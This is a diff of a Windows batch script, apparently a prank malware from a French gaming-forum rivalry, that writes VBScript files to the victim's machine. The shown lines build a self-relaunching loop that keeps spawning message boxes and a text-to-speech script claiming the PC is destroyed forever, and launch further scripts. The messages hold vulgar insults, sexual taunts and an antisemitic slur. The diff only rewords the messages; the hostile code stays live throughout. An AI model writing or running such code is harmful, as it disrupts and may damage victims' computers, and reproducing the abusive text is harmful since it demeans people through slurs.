@@ -168,11 +168,11 @@ set file=alerte_enculay.mp3
 
 
 @echo do>%prenom%.vbs
-@echo x=msgbox ("TU N'AS PLUS DE PAYCAY ENFANT DE H*PISTE, LE 15-18 T'A BIEN SODOMISÉ LE CUL" ,16+4096, "Cisla'wned :noel: :Y")>>%prenom%.vbs
+@echo x=msgbox ("Dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t'a bien baiser le cul :)")>>%prenom%.vbs
 @echo CreateObject("WScript.Shell").Run "%prenom%.vbs">>%prenom%.vbs
 @echo loop>>%prenom%.vbs
 
-@echo CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 15 18 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux birodar du 15-18.">%pute%.vbs
+@echo CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 18 25 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux raiyes du 18 25.">%pute%.vbs
 
 
 start %fdc%.vbs %MYFILES%\feuj.bat
